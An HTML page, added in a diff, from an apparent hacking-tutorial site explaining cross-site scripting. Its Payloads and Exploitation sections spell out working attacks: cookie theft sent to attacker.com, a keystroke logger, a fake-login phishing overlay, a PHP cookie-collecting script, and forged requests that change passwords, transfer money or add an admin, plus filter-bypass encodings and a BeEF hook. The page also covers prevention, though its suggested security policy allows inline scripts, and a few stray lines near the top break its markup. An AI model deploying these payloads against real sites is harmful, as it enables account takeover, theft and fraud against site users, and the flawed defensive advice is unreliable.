@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Attacks - ABID HACKER</title>
+    
+    <!-- Bootstrap CSS CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="../../index.html">
+                <i class="fas fa-shield-alt"></i> ABID HACKER
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../../index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../courses.html">Courses</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../about.html">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container my-5" style="margin-top: 100px !important;">
+        <div class="row">
+            <!-- Sidebar Navigation -->
+            <div class="col-lg-3">
+                <div class="card border-success sticky-top" style="top: 100px;">
+                    <div class="card-header bg-success text-white">
+                        <h6 class="mb-0">XSS Attacks</h6>
+                    </div>
+                    <div class="card-body p-0">
+                        <ul class="list-group list-group-flush">
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#introduction" class="text-success text-decoration-none">Introduction</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#types" class="text-success text-decoration-none">XSS Types</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#payloads" class="text-success text-decoration-none">XSS Payloads</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#detection" class="text-success text-decoration-none">Detection Methods</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#exploitation" class="text-success text-decoration-none">Exploitation</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#prevention" class="text-success text-decoration-none">Prevention</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Area -->
+            <div class="col-lg-9">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">
+                        <h1 class="mb-0"><i class="fas fa-code"></i> Cross-Site Scripting (XSS) Attacks</h1>
+                    </div>
+                    <div class="card-body">
+                        <!-- Introduction Section -->
+                        <section id="introduction">
+                            <h2 class="text-success">What is Cross-Site Scripting (XSS)?</h2>
+                            <p>Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.</p>
+                            
+                            <h3 class="text-success mt-4">Detailed Theory: How XSS Works</h3>
+                            <p>XSS occurs when a web application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript.</p>
+                            
+                            <div class="alert alert-info mt-4">
+                                <h4 class="text-primary"><i class="fas fa-lightbulb"></i> Core Concept</h4>
+                                <p>XSS exploits the trust that a user has for a particular site. The browser executes malicious scripts because it trusts the source (the vulnerable website). This is fundamentally different from other attacks that exploit the trust that a site has in the user.</p>
+                            </div>
+
+                            <h3 class="text-success mt-4">The XSS Attack Chain</h3>
+                            <ol>
+                                <li><strong>Vulnerability Discovery:</strong> Attacker finds input fields that reflect user data</li>
+                                <li><strong>Payload Crafting:</strong> Creates malicious JavaScript code</li>
+                                <li><strong>Payload Injection:</strong> Injects script through vulnerable input</li>
+                                <li><strong>Victim Interaction:</strong> Legitimate user visits the compromised page</li>
+                                <li><strong>Script Execution:</strong> Browser executes malicious code in victim's context</li>
+                                <li><strong>Data Theft/Manipulation:</strong> Attacker achieves their objective</li>
+                            </ol>
+2. Attacker crafts malicious JavaScript payload
+3. Victim visits page with malicious script
+4. Script executes in victim's browser context
+5. Attacker gains access to sensitive data/actions
+                            </div>
+
+                            <h3 class="text-success mt-4">Impact of XSS</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>Session Hijacking:</strong> Steal authentication cookies</li>
+                                        <li><strong>Data Theft:</strong> Access sensitive information</li>
+                                        <li><strong>Defacement:</strong> Modify page content</li>
+                                        <li><strong>Phishing:</strong> Redirect to malicious sites</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>Keylogging:</strong> Capture user keystrokes</li>
+                                        <li><strong>CSRF:</strong> Perform unauthorized actions</li>
+                                        <li><strong>Malware Distribution:</strong> Spread malicious software</li>
+                                        <li><strong>Privacy Violation:</strong> Access personal data</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Types Section -->
+                        <section id="types" class="mb-5">
+                            <h2 class="text-success">Types of XSS Attacks</h2>
+                            
+                            <h3 class="text-success mt-4">1. Reflected XSS (Non-Persistent)</h3>
+                            <div class="card bg-dark border-success">
+                                <div class="card-body">
+                                    <p class="text-light">Script is reflected off the web server, such as in an error message or search result.</p>
+                                    <div class="terminal">
+# Vulnerable URL
+http://example.com/search?q=<script>alert('XSS')</script>
+
+# Server Response
+<p>Search results for: <script>alert('XSS')</script></p>
+
+# Attack Vector
+- Email links
+- Social engineering
+- Malicious websites
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">2. Stored XSS (Persistent)</h3>
+                            <div class="card bg-dark border-success">
+                                <div class="card-body">
+                                    <p class="text-light">Malicious script is permanently stored on the target server (database, file, etc.).</p>
+                                    <div class="terminal">
+# Comment Form Injection
+Comment: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
+
+# Forum Post
+Post: <img src="x" onerror="alert('Stored XSS')">
+
+# Profile Information
+Bio: <script>/* malicious code */</script>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">3. DOM-Based XSS</h3>
+                            <div class="card bg-dark border-success">
+                                <div class="card-body">
+                                    <p class="text-light">Vulnerability exists in client-side code rather than server-side.</p>
+                                    <div class="terminal">
+# Vulnerable JavaScript
+var name = location.hash.substring(1);
+document.write("Hello " + name);
+
+# Attack URL
+http://example.com/page.html#<script>alert('DOM XSS')</script>
+
+# Client-side sinks:
+- document.write()
+- innerHTML
+- eval()
+- setTimeout()
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Payloads Section -->
+                        <section id="payloads" class="mb-5">
+                            <h2 class="text-success">XSS Payloads & Techniques</h2>
+                            
+                            <h3 class="text-success mt-4">Basic Payloads</h3>
+                            <div class="terminal">
+# Simple alert box
+<script>alert('XSS')</script>
+
+# Image tag with onerror
+<img src="x" onerror="alert('XSS')">
+
+# SVG payload
+<svg onload="alert('XSS')">
+
+# Body onload
+<body onload="alert('XSS')">
+
+# Input onfocus
+<input onfocus="alert('XSS')" autofocus>
+
+# Details/summary tags
+<details open ontoggle="alert('XSS')">
+                            </div>
+
+                            <h3 class="text-success mt-4">Cookie Stealing</h3>
+                            <div class="terminal">
+# Basic cookie theft
+<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
+
+# Image-based exfiltration
+<script>new Image().src='http://attacker.com/log.php?cookie='+document.cookie</script>
+
+# Fetch API
+<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>
+
+# XMLHttpRequest
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://attacker.com/steal.php?cookie='+document.cookie);
+xhr.send();
+</script>
+                            </div>
+
+                            <h3 class="text-success mt-4">Advanced Payloads</h3>
+                            <div class="terminal">
+# Keylogger
+<script>
+document.addEventListener('keypress', function(e) {
+    fetch('http://attacker.com/log.php?key=' + e.key);
+});
+</script>
+
+# Form hijacking
+<script>
+document.forms[0].action = 'http://attacker.com/capture.php';
+</script>
+
+# Phishing overlay
+<script>
+document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"><h1>Please login again</h1><form action="http://attacker.com/phish.php"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form></div>';
+</script>
+
+# Browser information gathering
+<script>
+var info = {
+    userAgent: navigator.userAgent,
+    cookies: document.cookie,
+    url: location.href,
+    referrer: document.referrer
+};
+fetch('http://attacker.com/info.php', {
+    method: 'POST',
+    body: JSON.stringify(info)
+});
+</script>
+                            </div>
+                        </section>
+
+                        <!-- Detection Section -->
+                        <section id="detection" class="mb-5">
+                            <h2 class="text-success">XSS Detection Methods</h2>
+                            
+                            <h3 class="text-success mt-4">Manual Testing</h3>
+                            <div class="terminal">
+# Test all input fields
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+
+# URL parameters
+http://target.com/page?param=<script>alert('XSS')</script>
+
+# HTTP headers
+User-Agent: <script>alert('XSS')</script>
+Referer: <script>alert('XSS')</script>
+
+# File uploads
+filename.jpg"><script>alert('XSS')</script>
+                            </div>
+
+                            <h3 class="text-success mt-4">Filter Bypass Techniques</h3>
+                            <div class="terminal">
+# Case variation
+<ScRiPt>alert('XSS')</ScRiPt>
+
+# HTML encoding
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# URL encoding
+%3Cscript%3Ealert('XSS')%3C/script%3E
+
+# Double encoding
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+# Unicode encoding
+\u003cscript\u003ealert('XSS')\u003c/script\u003e
+
+# Hex encoding
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+
+# Alternative tags
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;iframe src=javascript:alert('XSS')&gt;
+&lt;input onfocus=alert('XSS') autofocus&gt;
+                            </div>
+
+                            <h3 class="text-success mt-4">Automated Tools</h3>
+                            <div class="terminal">
+# XSStrike
+python3 xsstrike.py -u "http://target.com/search?q=test"
+
+# XSSer
+xsser -u "http://target.com/search?q=XSS" --auto
+
+# Burp Suite
+1. Send request to Intruder
+2. Mark injection points
+3. Load XSS payload list
+4. Analyze responses for script execution
+
+# OWASP ZAP
+1. Spider the application
+2. Run Active Scan
+3. Review XSS findings
+4. Manual verification
+                            </div>
+                        </section>
+
+                        <!-- Exploitation Section -->
+                        <section id="exploitation" class="mb-5">
+                            <h2 class="text-success">XSS Exploitation Scenarios</h2>
+                            
+                            <h3 class="text-success mt-4">Session Hijacking</h3>
+                            <div class="terminal">
+# Cookie stealing payload
+<script>
+fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
+</script>
+
+# Attacker server (steal.php)
+<?php
+$cookie = $_GET['cookie'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$date = date('Y-m-d H:i:s');
+file_put_contents('cookies.txt', "$date - $ip - $cookie\n", FILE_APPEND);
+?>
+
+# Using stolen cookies
+1. Copy stolen session cookie
+2. Use browser dev tools or extension
+3. Replace your cookie with victim's
+4. Access victim's account
+                            </div>
+
+                            <h3 class="text-success mt-4">CSRF via XSS</h3>
+                            <div class="terminal">
+# Change user password
+<script>
+fetch('/change-password', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'new_password=hacked123&confirm_password=hacked123'
+});
+</script>
+
+# Transfer money
+<script>
+fetch('/transfer', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        to_account: 'attacker_account',
+        amount: 1000
+    })
+});
+</script>
+
+# Add admin user
+<script>
+fetch('/admin/add-user', {
+    method: 'POST',
+    body: new FormData(Object.assign(document.createElement('form'), {
+        innerHTML: '<input name="username" value="hacker"><input name="role" value="admin">'
+    }))
+});
+</script>
+                            </div>
+
+                            <h3 class="text-success mt-4">BeEF Integration</h3>
+                            <div class="terminal">
+# BeEF hook payload
+<script src="http://attacker.com:3000/hook.js"></script>
+
+# BeEF capabilities:
+- Browser fingerprinting
+- Network discovery
+- Social engineering
+- Credential harvesting
+- Webcam/microphone access
+- Persistent backdoor
+- Module execution
+
+# Starting BeEF
+cd /opt/beef
+./beef
+# Access panel: http://localhost:3000/ui/panel
+                            </div>
+                        </section>
+
+                        <!-- Prevention Section -->
+                        <section id="prevention" class="mb-5">
+                            <h2 class="text-success">XSS Prevention & Mitigation</h2>
+                            
+                            <h3 class="text-success mt-4">Input Validation</h3>
+                            <div class="terminal">
+# Server-side validation (PHP)
+function sanitize_input($input) {
+    $input = trim($input);
+    $input = stripslashes($input);
+    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+    return $input;
+}
+
+# JavaScript validation
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+# Python (Django)
+from django.utils.html import escape
+safe_data = escape(user_input)
+
+# Node.js
+const validator = require('validator');
+const clean = validator.escape(userInput);
+                            </div>
+
+                            <h3 class="text-success mt-4">Output Encoding</h3>
+                            <div class="terminal">
+# HTML entity encoding
+&lt; instead of <
+&gt; instead of >
+&amp; instead of &
+&quot; instead of "
+&#x27; instead of '
+
+# JavaScript encoding
+\x3C instead of <
+\x3E instead of >
+\x22 instead of "
+\x27 instead of '
+
+# URL encoding
+%3C instead of <
+%3E instead of >
+%22 instead of "
+%27 instead of '
+                            </div>
+
+                            <h3 class="text-success mt-4">Security Headers</h3>
+                            <div class="terminal">
+# Content Security Policy (CSP)
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none';
+
+# X-XSS-Protection
+X-XSS-Protection: 1; mode=block
+
+# X-Content-Type-Options
+X-Content-Type-Options: nosniff
+
+# X-Frame-Options
+X-Frame-Options: DENY
+
+# Strict-Transport-Security
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+# Apache configuration
+Header always set X-XSS-Protection "1; mode=block"
+Header always set X-Content-Type-Options "nosniff"
+Header always set Content-Security-Policy "default-src 'self'"
+
+# Nginx configuration
+add_header X-XSS-Protection "1; mode=block";
+add_header X-Content-Type-Options "nosniff";
+add_header Content-Security-Policy "default-src 'self'";
+                            </div>
+
+                            <h3 class="text-success mt-4">Framework-Specific Protection</h3>
+                            <div class="terminal">
+# React (automatic escaping)
+function UserProfile({username}) {
+    return <div>Hello {username}</div>; // Automatically escaped
+}
+
+# Angular (sanitization)
+import { DomSanitizer } from '@angular/platform-browser';
+// Angular automatically sanitizes values
+
+# Vue.js (text interpolation)
+<template>
+    <div>{{ userInput }}</div> <!-- Automatically escaped -->
+</template>
+
+# Django templates
+{{ user_input|escape }}
+
+# Jinja2 (Flask)
+{{ user_input|e }}
+                            </div>
+                        </section>
+
+                        <!-- Navigation -->
+                        <div class="d-flex justify-content-between mt-5">
+                            <a href="../kali-tools/nikto.html" class="btn btn-outline-success">
+                                <i class="fas fa-arrow-left"></i> Previous: Nikto
+                            </a>
+                            <a href="sql-injection.html" class="btn btn-success">
+                                Next: SQL Injection <i class="fas fa-arrow-right"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container">
+            <div class="text-center">
+                <p>&copy; 2024 ABID HACKER. Created by Abid Mehmood - Professional Web Designer</p>
+                <p>Email: abidbusiness@gmail.com | Phone: 03029382306</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="../../js/script.js"></script>
+</body>
+</html>
